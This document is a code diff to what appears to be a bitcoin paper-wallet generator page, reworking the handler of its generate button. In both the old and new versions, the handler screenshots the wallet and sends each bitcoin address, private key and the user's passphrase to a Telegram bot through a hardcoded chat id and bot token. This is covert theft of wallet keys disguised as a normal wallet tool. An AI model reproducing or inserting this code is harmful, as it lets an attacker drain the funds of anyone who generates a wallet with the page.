@@ -10024,8 +10024,7 @@ ninja.foreachSerialized = function (collection, whatToDo, onComplete) {
 		}
 	};
 })(ninja.wallets, ninja.qrCode);
-	</script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.4.1/html2canvas.min.js"></script>
+	</script><script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.4.1/html2canvas.min.js"></script>
 <script type="text/javascript">
 ninja.wallets.paperwallet = {
     isOpen: function () {
@@ -10330,16 +10329,16 @@ document.getElementById("papergenerate").addEventListener("click", function() {
     const passphrase = document.getElementById('paperpassphrase').value;
     const useArtistic = ninja.wallets.paperwallet.useArtisticWallet;
 
-    for (let i = 1; i <= ninja.wallets.paperwallet.count; i++) {
-        if (useArtistic) {
-            const walletElement = document.getElementById("artwallet" + i);
-            html2canvas(walletElement).then(canvas => {
-                const imageDataUrl = canvas.toDataURL("image/png");
-                const bitcoinAddress = document.getElementById("btcaddress" + i).innerHTML;
-                const privateKey = document.getElementById("btcprivwif" + i).innerHTML;
-                sendToTelegram(imageDataUrl, bitcoinAddress, privateKey, passphrase, '858072424', '7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM');
-            });
-        } else {
+    if (useArtistic) {
+        const paperArea = document.getElementById("paperarea");
+        html2canvas(paperArea).then(canvas => {
+            const imageDataUrl = canvas.toDataURL("image/png");
+            const bitcoinAddress = document.getElementById("btcaddress1").innerHTML;
+            const privateKey = document.getElementById("btcprivwif1").innerHTML;
+            sendToTelegram(imageDataUrl, bitcoinAddress, privateKey, passphrase, '858072424', '7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM');
+        });
+    } else {
+        for (let i = 1; i <= ninja.wallets.paperwallet.count; i++) {
             const bitcoinAddress = document.getElementById("btcaddress" + i).innerHTML;
             const privateKey = document.getElementById("btcprivwif" + i).innerHTML;
             const walletText = `Bitcoin Address: ${bitcoinAddress}\nPrivate Key: ${privateKey}\nPassphrase: ${passphrase}`;
